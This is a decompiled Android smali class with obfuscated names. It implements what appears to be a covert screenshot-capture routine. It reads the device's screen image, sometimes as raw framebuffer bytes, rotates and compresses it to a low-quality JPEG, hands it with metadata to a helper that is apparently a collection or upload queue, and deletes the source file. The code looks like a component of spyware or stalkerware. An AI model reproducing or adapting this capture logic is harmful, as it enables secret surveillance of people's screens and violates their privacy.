.class public Lb/d/d/z0/d;
.super Lb/d/c/i;
.source ""


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Lb/d/c/i;-><init>()V

    return-void
.end method


# virtual methods
.method protected a([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 24

    move-object/from16 v0, p1

    const-string v1, "b n"

    const-string v2, "f n"

    const-string v3, "TsScr"

    const/4 v4, 0x0

    .line 1
    :try_start_0
    invoke-static {}, Lb/d/d/z0/e;->r()Z

    move-result v5

    if-eqz v5, :cond_15

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v5

    const-string v7, "ScrLastTime"

    .line 2
    invoke-static {v7, v5, v6}, Lcom/utils/core/g0;->b(Ljava/lang/String;J)V

    .line 3
    invoke-static {}, Lcom/utils/core/u;->h()Ljava/lang/String;

    move-result-object v5

    const/4 v6, 0x2

    new-array v6, v6, [Ljava/lang/String;

    const/4 v7, 0x0

    aput-object v4, v6, v7

    const/4 v15, 0x1

    aput-object v4, v6, v15

    new-instance v14, Ljava/io/File;

    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v9, Lb/d/d/z0/e;->g:Lb/d/d/z0/e;

    iget-object v9, v9, Lcom/utils/core/h0/e;->b:Ljava/lang/String;

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v9, Ljava/io/File;->separator:Ljava/lang/String;

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-direct {v14, v8}, Ljava/io/File;-><init>(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_19

    const-string v8, "im"

    const/4 v9, -0x1

    if-eqz v0, :cond_0

    :try_start_1
    array-length v10, v0

    if-lez v10, :cond_0

    aget-object v10, v0, v7
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_19

    if-eqz v10, :cond_0

    :try_start_2
    new-instance v10, Lorg/json/JSONObject;

    aget-object v0, v0, v7

    check-cast v0, Ljava/lang/String;

    invoke-direct {v10, v0}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v11, "+ "

    invoke-virtual {v0, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v3, v0}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;)V

    const-string v0, "_id"

    invoke-virtual {v10, v0}, Lorg/json/JSONObject;->getInt(Ljava/lang/String;)I

    move-result v0
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    :try_start_3
    invoke-virtual {v10, v8}, Lorg/json/JSONObject;->getInt(Ljava/lang/String;)I

    move-result v10
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    move v11, v10

    move-object v10, v4

    goto :goto_1

    :catch_0
    const/4 v0, -0x1

    :catch_1
    move-object v10, v4

    goto :goto_0

    :cond_0
    :try_start_4
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    invoke-static {v0}, Lb/d/f/g;->a(Ljava/util/ArrayList;)Lb/d/a/a;

    move-result-object v10

    if-eqz v10, :cond_1

    new-instance v11, Ljava/lang/StringBuilder;

    invoke-direct {v11}, Ljava/lang/StringBuilder;-><init>()V

    const-string v12, "* "

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v12, v10, Lb/d/a/a;->a:[Ljava/lang/String;

    aget-object v12, v12, v7

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    invoke-static {v3, v11}, Lb/d/c/d0;->b(Ljava/lang/String;Ljava/lang/String;)V

    iget-object v10, v10, Lb/d/a/a;->f:[I

    aget v11, v10, v7

    aget v10, v10, v15

    move/from16 v23, v10

    move-object v10, v0

    move v0, v11

    move/from16 v11, v23

    goto :goto_1

    :cond_1
    move-object v10, v0

    const/4 v0, -0x1

    :goto_0
    const/4 v11, -0x1

    :goto_1
    if-eq v0, v9, :cond_2

    move-object/from16 v17, v8

    move/from16 v16, v11

    goto :goto_2

    :cond_2
    invoke-static {v6, v10}, Lcom/utils/core/u;->a([Ljava/lang/String;Ljava/util/ArrayList;)V

    const-string v0, "scr"

    move-object/from16 v17, v0

    const/16 v16, 0x1

    :goto_2
    invoke-static {}, Lcom/utils/core/d0;->j()Z

    move-result v0

    if-eqz v0, :cond_13

    invoke-static {}, Lcom/utils/core/d0;->c()Ljava/io/File;

    move-result-object v13

    if-eqz v13, :cond_13

    invoke-virtual {v13}, Ljava/io/File;->exists()Z

    move-result v0

    if-eqz v0, :cond_13

    const-string v8, "image/png"
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_19

    .line 4
    :try_start_5
    invoke-static {}, Lcom/utils/core/u;->i()Landroid/view/WindowManager;

    move-result-object v0

    if-eqz v0, :cond_4

    invoke-interface {v0}, Landroid/view/WindowManager;->getDefaultDisplay()Landroid/view/Display;

    move-result-object v0

    invoke-virtual {v0}, Landroid/view/Display;->getRotation()I

    move-result v0
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_2

    if-eqz v0, :cond_3

    if-eq v0, v15, :cond_3

    const/4 v9, 0x3

    if-eq v0, v9, :cond_3

    goto :goto_3

    :cond_3
    const/16 v0, 0x5a

    const/16 v9, 0x5a

    goto :goto_4

    :catch_2
    move-exception v0

    :try_start_6
    const-string v9, "CrFn"

    const-string v10, "sOr"

    invoke-static {v9, v10, v0}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Exception;)V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_19

    :cond_4
    :goto_3
    const/4 v9, 0x0

    .line 5
    :goto_4
    :try_start_7
    invoke-virtual {v13}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/utils/core/u;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v10, "png"

    invoke-virtual {v0, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_14
    .catchall {:try_start_7 .. :try_end_7} :catchall_3

    const/16 v10, 0x8

    if-eqz v0, :cond_5

    :try_start_8
    new-instance v0, Landroid/graphics/BitmapFactory$Options;

    invoke-direct {v0}, Landroid/graphics/BitmapFactory$Options;-><init>()V

    iput v10, v0, Landroid/graphics/BitmapFactory$Options;->inSampleSize:I

    invoke-virtual {v13}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v10

    invoke-static {v10, v0}, Landroid/graphics/BitmapFactory;->decodeFile(Ljava/lang/String;Landroid/graphics/BitmapFactory$Options;)Landroid/graphics/Bitmap;

    move-result-object v0
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_3
    .catchall {:try_start_8 .. :try_end_8} :catchall_0

    goto :goto_5

    :catchall_0
    move-exception v0

    goto :goto_6

    :catch_3
    move-exception v0

    :try_start_9
    const-string v10, "bm P"

    invoke-static {v3, v10, v0}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Exception;)V
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_4
    .catchall {:try_start_9 .. :try_end_9} :catchall_0

    move-object v0, v4

    :goto_5
    move-object v4, v0

    move-object/from16 v21, v5

    move-object/from16 v22, v6

    move-object/from16 v19, v8

    goto/16 :goto_e

    :goto_6
    move-object v5, v4

    goto/16 :goto_1a

    :catch_4
    move-exception v0

    move-object/from16 v21, v5

    move-object/from16 v22, v6

    move-object/from16 v19, v8

    move-object v5, v4

    goto/16 :goto_15

    :cond_5
    :try_start_a
    const-string v11, "DM"
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_14
    .catchall {:try_start_a .. :try_end_a} :catchall_3

    .line 6
    :try_start_b
    invoke-static {}, Lcom/utils/core/u;->i()Landroid/view/WindowManager;

    move-result-object v0

    invoke-interface {v0}, Landroid/view/WindowManager;->getDefaultDisplay()Landroid/view/Display;

    move-result-object v0

    if-eqz v0, :cond_7

    new-instance v12, Landroid/util/DisplayMetrics;

    invoke-direct {v12}, Landroid/util/DisplayMetrics;-><init>()V

    sget v4, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v7, 0x11

    if-lt v4, v7, :cond_6

    invoke-virtual {v0, v12}, Landroid/view/Display;->getRealMetrics(Landroid/util/DisplayMetrics;)V

    goto :goto_7

    :cond_6
    invoke-virtual {v0, v12}, Landroid/view/Display;->getMetrics(Landroid/util/DisplayMetrics;)V

    :goto_7
    new-instance v0, Landroid/graphics/PixelFormat;

    invoke-direct {v0}, Landroid/graphics/PixelFormat;-><init>()V

    invoke-static {v15, v0}, Landroid/graphics/PixelFormat;->getPixelFormatInfo(ILandroid/graphics/PixelFormat;)V

    iget v7, v12, Landroid/util/DisplayMetrics;->widthPixels:I
    :try_end_b
    .catch Ljava/lang/Exception; {:try_start_b .. :try_end_b} :catch_8
    .catchall {:try_start_b .. :try_end_b} :catchall_3

    :try_start_c
    iget v4, v12, Landroid/util/DisplayMetrics;->heightPixels:I
    :try_end_c
    .catch Ljava/lang/Exception; {:try_start_c .. :try_end_c} :catch_7
    .catchall {:try_start_c .. :try_end_c} :catchall_3

    mul-int v18, v4, v7

    :try_start_d
    iget v0, v0, Landroid/graphics/PixelFormat;->bytesPerPixel:I

    mul-int v0, v0, v18

    new-array v15, v0, [B
    :try_end_d
    .catch Ljava/lang/Exception; {:try_start_d .. :try_end_d} :catch_6
    .catchall {:try_start_d .. :try_end_d} :catchall_3

    :try_start_e
    iget v0, v12, Landroid/util/DisplayMetrics;->densityDpi:I
    :try_end_e
    .catch Ljava/lang/Exception; {:try_start_e .. :try_end_e} :catch_5
    .catchall {:try_start_e .. :try_end_e} :catchall_3

    goto :goto_9

    :catch_5
    move-exception v0

    move v12, v7

    move v7, v4

    move-object v4, v15

    goto :goto_8

    :catch_6
    move-exception v0

    move v12, v7

    move v7, v4

    const/4 v4, 0x0

    goto :goto_8

    :catch_7
    move-exception v0

    move v12, v7

    const/4 v4, 0x0

    const/4 v7, 0x0

    goto :goto_8

    :cond_7
    :try_start_f
    const-string v0, "Dm n"

    invoke-static {v11, v0}, Lb/d/c/d0;->b(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_f
    .catch Ljava/lang/Exception; {:try_start_f .. :try_end_f} :catch_8
    .catchall {:try_start_f .. :try_end_f} :catchall_3

    const/4 v4, 0x0

    const/4 v7, 0x0

    const/4 v15, 0x0

    goto :goto_9

    :catch_8
    move-exception v0

    const/4 v4, 0x0

    const/4 v7, 0x0

    const/4 v12, 0x0

    :goto_8
    :try_start_10
    const-string v15, "Dm"

    invoke-static {v11, v15, v0}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Exception;)V
    :try_end_10
    .catch Ljava/lang/Exception; {:try_start_10 .. :try_end_10} :catch_14
    .catchall {:try_start_10 .. :try_end_10} :catchall_3

    move-object v15, v4

    move v4, v7

    move v7, v12

    :goto_9
    if-eqz v15, :cond_9

    .line 7
    :try_start_11
    new-instance v0, Ljava/io/FileInputStream;

    new-instance v11, Ljava/io/File;

    invoke-virtual {v13}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v12

    invoke-direct {v11, v12}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-direct {v0, v11}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    new-instance v11, Ljava/io/DataInputStream;

    invoke-direct {v11, v0}, Ljava/io/DataInputStream;-><init>(Ljava/io/InputStream;)V

    invoke-virtual {v11, v15}, Ljava/io/DataInputStream;->readFully([B)V

    invoke-virtual {v11}, Ljava/io/DataInputStream;->close()V

    mul-int v11, v4, v7

    new-array v11, v11, [I

    const/4 v12, 0x0

    :goto_a
    array-length v10, v11
    :try_end_11
    .catch Ljava/lang/Exception; {:try_start_11 .. :try_end_11} :catch_d
    .catchall {:try_start_11 .. :try_end_11} :catchall_3

    if-ge v12, v10, :cond_8

    mul-int/lit8 v10, v12, 0x4

    move-object/from16 v19, v8

    :try_start_12
    aget-byte v8, v15, v10
    :try_end_12
    .catch Ljava/lang/Exception; {:try_start_12 .. :try_end_12} :catch_a
    .catchall {:try_start_12 .. :try_end_12} :catchall_3

    and-int/lit16 v8, v8, 0xff

    add-int/lit8 v20, v10, 0x1

    move-object/from16 v21, v5

    :try_start_13
    aget-byte v5, v15, v20
    :try_end_13
    .catch Ljava/lang/Exception; {:try_start_13 .. :try_end_13} :catch_9
    .catchall {:try_start_13 .. :try_end_13} :catchall_3

    and-int/lit16 v5, v5, 0xff

    add-int/lit8 v20, v10, 0x2

    move-object/from16 v22, v6

    :try_start_14
    aget-byte v6, v15, v20

    and-int/lit16 v6, v6, 0xff

    add-int/lit8 v10, v10, 0x3

    aget-byte v10, v15, v10

    and-int/lit16 v10, v10, 0xff

    shl-int/lit8 v10, v10, 0x18

    shl-int/lit8 v8, v8, 0x10

    add-int/2addr v10, v8

    const/16 v8, 0x8

    shl-int/2addr v5, v8

    add-int/2addr v10, v5

    add-int/2addr v10, v6

    aput v10, v11, v12

    add-int/lit8 v12, v12, 0x1

    move-object/from16 v8, v19

    move-object/from16 v5, v21

    move-object/from16 v6, v22

    goto :goto_a

    :catch_9
    move-exception v0

    :goto_b
    move-object/from16 v22, v6

    goto :goto_c

    :catch_a
    move-exception v0

    move-object/from16 v21, v5

    goto :goto_b

    :cond_8
    move-object/from16 v21, v5

    move-object/from16 v22, v6

    move-object/from16 v19, v8

    sget-object v5, Landroid/graphics/Bitmap$Config;->ARGB_8888:Landroid/graphics/Bitmap$Config;

    invoke-static {v11, v7, v4, v5}, Landroid/graphics/Bitmap;->createBitmap([IIILandroid/graphics/Bitmap$Config;)Landroid/graphics/Bitmap;

    move-result-object v4
    :try_end_14
    .catch Ljava/lang/Exception; {:try_start_14 .. :try_end_14} :catch_c
    .catchall {:try_start_14 .. :try_end_14} :catchall_3

    :try_start_15
    invoke-virtual {v0}, Ljava/io/FileInputStream;->close()V
    :try_end_15
    .catch Ljava/lang/Exception; {:try_start_15 .. :try_end_15} :catch_b
    .catchall {:try_start_15 .. :try_end_15} :catchall_2

    goto :goto_e

    :catch_b
    move-exception v0

    goto :goto_d

    :catch_c
    move-exception v0

    goto :goto_c

    :catch_d
    move-exception v0

    move-object/from16 v21, v5

    move-object/from16 v22, v6

    move-object/from16 v19, v8

    :goto_c
    const/4 v4, 0x0

    :goto_d
    :try_start_16
    const-string v5, "ObScr"

    const-string v6, "bm R"

    invoke-static {v5, v6, v0}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Exception;)V
    :try_end_16
    .catch Ljava/lang/Exception; {:try_start_16 .. :try_end_16} :catch_e
    .catchall {:try_start_16 .. :try_end_16} :catchall_2

    goto :goto_e

    :catch_e
    move-exception v0

    move-object v5, v4

    const/4 v4, 0x0

    goto/16 :goto_15

    :cond_9
    move-object/from16 v21, v5

    move-object/from16 v22, v6

    move-object/from16 v19, v8

    const/4 v4, 0x0

    :goto_e
    if-eqz v4, :cond_c

    if-eqz v9, :cond_a

    :try_start_17
    new-instance v10, Landroid/graphics/Matrix;

    invoke-direct {v10}, Landroid/graphics/Matrix;-><init>()V

    int-to-float v0, v9

    invoke-virtual {v10, v0}, Landroid/graphics/Matrix;->postRotate(F)Z

    const/4 v6, 0x0

    const/4 v7, 0x0

    invoke-virtual {v4}, Landroid/graphics/Bitmap;->getWidth()I

    move-result v8

    invoke-virtual {v4}, Landroid/graphics/Bitmap;->getHeight()I

    move-result v9

    const/4 v11, 0x1

    move-object v5, v4

    invoke-static/range {v5 .. v11}, Landroid/graphics/Bitmap;->createBitmap(Landroid/graphics/Bitmap;IIIILandroid/graphics/Matrix;Z)Landroid/graphics/Bitmap;

    move-result-object v0

    move-object v4, v0

    :cond_a
    new-instance v5, Ljava/io/FileOutputStream;

    invoke-direct {v5, v14}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V
    :try_end_17
    .catch Ljava/lang/Exception; {:try_start_17 .. :try_end_17} :catch_10
    .catchall {:try_start_17 .. :try_end_17} :catchall_2

    :try_start_18
    sget-object v0, Landroid/graphics/Bitmap$CompressFormat;->JPEG:Landroid/graphics/Bitmap$CompressFormat;

    const/16 v6, 0x28

    invoke-virtual {v4, v0, v6, v5}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    move-result v0

    if-eqz v0, :cond_b

    invoke-virtual {v14}, Ljava/io/File;->exists()Z

    move-result v0

    if-eqz v0, :cond_b

    invoke-virtual {v14}, Ljava/io/File;->length()J

    move-result-wide v6

    sget-wide v8, Lcom/utils/core/g0;->e:J

    cmp-long v0, v6, v8

    if-lez v0, :cond_b

    const-string v0, "image/jpeg"

    move-object v8, v0

    goto :goto_12

    :cond_b
    invoke-virtual {v14}, Ljava/io/File;->delete()Z

    invoke-virtual {v13, v14}, Ljava/io/File;->renameTo(Ljava/io/File;)Z

    invoke-static {v13, v14}, Lcom/utils/core/u;->a(Ljava/io/File;Ljava/io/File;)Z
    :try_end_18
    .catch Ljava/lang/Exception; {:try_start_18 .. :try_end_18} :catch_f
    .catchall {:try_start_18 .. :try_end_18} :catchall_1

    goto :goto_10

    :catchall_1
    move-exception v0

    goto :goto_11

    :catch_f
    move-exception v0

    goto :goto_f

    :catchall_2
    move-exception v0

    move-object v5, v4

    const/4 v4, 0x0

    goto/16 :goto_1a

    :catch_10
    move-exception v0

    const/4 v5, 0x0

    :goto_f
    :try_start_19
    const-string v6, "bm"

    invoke-static {v3, v6, v0}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Exception;)V
    :try_end_19
    .catch Ljava/lang/Exception; {:try_start_19 .. :try_end_19} :catch_11
    .catchall {:try_start_19 .. :try_end_19} :catchall_1

    :goto_10
    move-object/from16 v8, v19

    goto :goto_12

    :goto_11
    move-object/from16 v23, v5

    move-object v5, v4

    move-object/from16 v4, v23

    goto/16 :goto_1a

    :catch_11
    move-exception v0

    move-object/from16 v23, v5

    move-object v5, v4

    move-object/from16 v4, v23

    goto :goto_15

    :cond_c
    move-object/from16 v8, v19

    const/4 v5, 0x0

    :goto_12
    if-eqz v5, :cond_d

    :try_start_1a
    invoke-virtual {v5}, Ljava/io/FileOutputStream;->close()V
    :try_end_1a
    .catch Ljava/lang/Exception; {:try_start_1a .. :try_end_1a} :catch_12

    goto :goto_13

    :catch_12
    move-exception v0

    move-object v5, v0

    :try_start_1b
    invoke-static {v3, v2, v5}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Exception;)V
    :try_end_1b
    .catch Ljava/lang/Exception; {:try_start_1b .. :try_end_1b} :catch_19

    :cond_d
    :goto_13
    if-eqz v4, :cond_e

    :try_start_1c
    invoke-virtual {v4}, Landroid/graphics/Bitmap;->recycle()V
    :try_end_1c
    .catch Ljava/lang/Exception; {:try_start_1c .. :try_end_1c} :catch_13

    goto :goto_14

    :catch_13
    move-exception v0

    move-object/from16 v19, v8

    goto :goto_17

    :cond_e
    :goto_14
    move-object v11, v8

    goto :goto_19

    :catchall_3
    move-exception v0

    move-object v6, v0

    const/4 v4, 0x0

    const/4 v5, 0x0

    goto :goto_1b

    :catch_14
    move-exception v0

    move-object/from16 v21, v5

    move-object/from16 v22, v6

    move-object/from16 v19, v8

    const/4 v4, 0x0

    const/4 v5, 0x0

    :goto_15
    :try_start_1d
    const-string v6, "bm f"

    invoke-static {v3, v6, v0}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Exception;)V
    :try_end_1d
    .catchall {:try_start_1d .. :try_end_1d} :catchall_4

    if-eqz v4, :cond_f

    :try_start_1e
    invoke-virtual {v4}, Ljava/io/FileOutputStream;->close()V
    :try_end_1e
    .catch Ljava/lang/Exception; {:try_start_1e .. :try_end_1e} :catch_15

    goto :goto_16

    :catch_15
    move-exception v0

    move-object v4, v0

    :try_start_1f
    invoke-static {v3, v2, v4}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Exception;)V
    :try_end_1f
    .catch Ljava/lang/Exception; {:try_start_1f .. :try_end_1f} :catch_19

    :cond_f
    :goto_16
    if-eqz v5, :cond_10

    :try_start_20
    invoke-virtual {v5}, Landroid/graphics/Bitmap;->recycle()V
    :try_end_20
    .catch Ljava/lang/Exception; {:try_start_20 .. :try_end_20} :catch_16

    goto :goto_18

    :catch_16
    move-exception v0

    :goto_17
    :try_start_21
    invoke-static {v3, v1, v0}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Exception;)V

    :cond_10
    :goto_18
    move-object/from16 v11, v19

    :goto_19
    const/4 v1, 0x0

    aget-object v10, v22, v1

    const-string v12, ""

    move-object v8, v14

    move-object/from16 v9, v21

    move-object v1, v13

    move/from16 v13, v16

    move-object v2, v14

    move-object/from16 v14, v17

    invoke-static/range {v8 .. v14}, Lcom/utils/core/u;->a(Ljava/io/File;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;ILjava/lang/String;)Ljava/io/File;

    invoke-virtual {v1}, Ljava/io/File;->delete()Z
    :try_end_21
    .catch Ljava/lang/Exception; {:try_start_21 .. :try_end_21} :catch_19

    const/16 v18, 0x1

    goto :goto_1e

    :catchall_4
    move-exception v0

    :goto_1a
    move-object v6, v0

    :goto_1b
    if-eqz v4, :cond_11

    :try_start_22
    invoke-virtual {v4}, Ljava/io/FileOutputStream;->close()V
    :try_end_22
    .catch Ljava/lang/Exception; {:try_start_22 .. :try_end_22} :catch_17

    goto :goto_1c

    :catch_17
    move-exception v0

    move-object v4, v0

    :try_start_23
    invoke-static {v3, v2, v4}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Exception;)V
    :try_end_23
    .catch Ljava/lang/Exception; {:try_start_23 .. :try_end_23} :catch_19

    :cond_11
    :goto_1c
    if-eqz v5, :cond_12

    :try_start_24
    invoke-virtual {v5}, Landroid/graphics/Bitmap;->recycle()V
    :try_end_24
    .catch Ljava/lang/Exception; {:try_start_24 .. :try_end_24} :catch_18

    goto :goto_1d

    :catch_18
    move-exception v0

    move-object v2, v0

    :try_start_25
    invoke-static {v3, v1, v2}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Exception;)V

    :cond_12
    :goto_1d
    throw v6

    :cond_13
    move-object/from16 v21, v5

    move-object/from16 v22, v6

    move-object v2, v14

    const/16 v18, 0x0

    :goto_1e
    if-nez v18, :cond_15

    invoke-static {v2}, Lb/d/c/j0;->a(Ljava/io/File;)Z

    move-result v0

    if-eqz v0, :cond_14

    const/4 v1, 0x0

    aget-object v10, v22, v1

    const-string v11, "image/jpeg"

    const-string v12, ""

    move-object v8, v2

    move-object/from16 v9, v21

    move/from16 v13, v16

    move-object/from16 v14, v17

    invoke-static/range {v8 .. v14}, Lcom/utils/core/u;->a(Ljava/io/File;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;ILjava/lang/String;)Ljava/io/File;

    goto :goto_1f

    :cond_14
    const-string v0, "not done"

    invoke-static {v3, v0}, Lb/d/c/d0;->b(Ljava/lang/String;Ljava/lang/String;)V

    :cond_15
    :goto_1f
    sget-object v0, Lcom/utils/services/a;->j:Lcom/utils/services/a;

    invoke-static {v0}, Lcom/utils/services/ServiceCore;->b(Lcom/utils/services/a;)V
    :try_end_25
    .catch Ljava/lang/Exception; {:try_start_25 .. :try_end_25} :catch_19

    goto :goto_20

    :catch_19
    move-exception v0

    const-string v1, "gS"

    invoke-static {v3, v1, v0}, Lb/d/c/d0;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Exception;)V

    :goto_20
    const/4 v1, 0x0

    return-object v1
.end method
